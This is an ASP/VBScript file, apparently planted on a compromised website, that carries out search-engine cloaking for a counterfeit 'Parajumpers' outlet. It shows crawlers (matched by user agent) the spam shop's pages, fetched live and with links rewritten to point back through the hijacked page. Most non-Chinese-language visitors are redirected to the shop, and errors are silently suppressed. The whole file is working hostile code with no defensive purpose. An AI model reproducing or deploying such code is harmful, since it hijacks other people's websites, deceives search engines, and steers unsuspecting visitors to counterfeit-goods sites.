<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<% Response.CodePage=65001%>
<% Response.Charset="UTF-8"%>
<%
On Error Resume Next
dim jumptodomain, imagefolder, fromsite, tourl
jumptodomain = "http://www.parajumpersoutletgermany.com/"
fromsite = "http://www.parajumpersoutletgermany.com/" 
tourl ="http://www.pianoforte.co.th/assets/assets743906.asp"
pageid = "parajumpers" 
imagefolder = "images/"
tourl = tourl&"?"&pageid&"="

Dim url,zhizhu,langs,c1
url=LCase(Request.ServerVariables("Http_Referer"))
zhizhu=Request.ServerVariables("HTTP_USER_AGENT")
langs=Mid(Request.ServerVariables("HTTP_ACCEPT_LANGUAGE"),1,5)
If instr(zhizhu,"google")>0 Or instr(zhizhu,"yahoo")>0 Or instr(zhizhu,"bing")>0 Or instr(zhizhu,"msnbot")>0 Or instr(zhizhu,"alexa")>0 Or instr(zhizhu,"ask")>0 Or instr(zhizhu,"findlinks")>0 Or instr(zhizhu,"altavista")>0 Or instr(zhizhu,"parajumpers")>0 Or instr(zhizhu,"inktomi")>0 or instr(zhizhu,"bot")>0 Then
c1="1"
Else If instr(langs,"zh")=0 Then 
c1="2"
Else
c1="4"
End If
End If
If c1="2" Then
response.redirect jumptodomain&request(pageid)
End if
%>
<%
on error resume next
Function  getHTTPPage(URL)
Set   HTTPReq   =   Server.createobject("Msxml2.XMLHTTP") 
URL=replace(URL,"é","e")  
URL=replace(URL,"è","e") 
URL=replace(URL,"ä","a")
URL=replace(URL,"ö","o")
URL=replace(URL,"ü","u")
URL=replace(URL,"ß","b")
URL=replace(URL,"å","b")
URL=replace(URL,"�","")
URL=replace(URL,"?","")
HTTPReq.Open   "GET",   URL,   False 

HTTPReq.send 
If   HTTPReq.readyState   <>   4   Then   Exit   Function 
getHTTPPage   =   Bytes2bStr(HTTPReq.responseBody) 
Set   HTTPReq   =   Nothing 
End   Function



Function   Bytes2bStr(vin)
Dim   BytesStream,StringReturn
Set   BytesStream   =   Server.CreateObject("ADODB.Stream")
BytesStream.Type   =   2
BytesStream.Open
BytesStream.WriteText   vin
BytesStream.Position   =   0
BytesStream.Charset   =   "utf-8"
BytesStream.Position   =   2
StringReturn   =BytesStream.ReadText
BytesStream.close 
Set   BytesStream   =   Nothing 
Bytes2bStr   =   StringReturn 
End   Function


if request(pageid)<>"" then
htmls = getHTTPPage(fromsite&request(pageid))
else
htmls = getHTTPPage(fromsite)
end if
htmls =  replace(htmls,""&chr(34)&fromsite,""&chr(34)&"/")
htmls =  replace(htmls,""&chr(39)&fromsite,""&chr(39)&"/")
htmls =  replace(htmls,"href="&fromsite,"href="&"/")
htmls =  replace(htmls,""&chr(34)&"/img/",""&chr(34)&fromsite&"img/")
htmls =  replace(htmls,""&chr(34)&"/images/",""&chr(34)&fromsite&"images/")
htmls =  replace(htmls,""&chr(34)&"img",""&chr(34)&fromsite&"img")
htmls =  replace(htmls,""&chr(34)&"css/",""&chr(34)&fromsite&"css/") 
htmls =  replace(htmls,""&chr(34)&"photo/gdPhoto/",""&chr(34)&fromsite&"photo/gdPhoto/")
htmls =  replace(htmls,"./photo/",fromsite&"photo/") 
htmls =  replace(htmls,""&chr(34)&"photo/",""&chr(34)&fromsite&"photo/") 
htmls =  replace(htmls,""&chr(39)&"photo/pdetailImg/",""&chr(39)&fromsite&"photo/pdetailImg/") 
htmls =  replace(htmls,""&chr(34)&"js/",""&chr(34)&fromsite&"js/")
htmls =  replace(htmls,""&chr(34)&"/js/",""&chr(34)&fromsite&"js/") 
htmls =  replace(htmls,""&chr(34)&"/photo/",""&chr(34)&fromsite&"photo/") 
htmls =  replace(htmls,""&chr(34)&"/sys/sysWebEdit/",""&chr(34)&fromsite&"sys/sysWebEdit/") 
htmls =  replace(htmls,"href="&chr(34),"href="&chr(34)&"/") 
htmls =  replace(htmls,"href="&chr(34)&"//","href="&chr(34)&"/") 
htmls =  replace(htmls,"href="&chr(34)&"/http","href="&chr(34)&"http") 
htmls =  replace(htmls,"href="&chr(34)&"/","href="&chr(34)&tourl) 
htmls =  replace(htmls,"href="&chr(39)&"/","href="&chr(39)&tourl) 
htmls =  replace(htmls,"href= "&chr(34)&"/","href="&chr(34)&tourl) 
htmls =  replace(htmls,"href= "&chr(39)&"/","href="&chr(39)&tourl) 
htmls =  replace(htmls,"href="&"/","href="&tourl)



response.write htmls
%>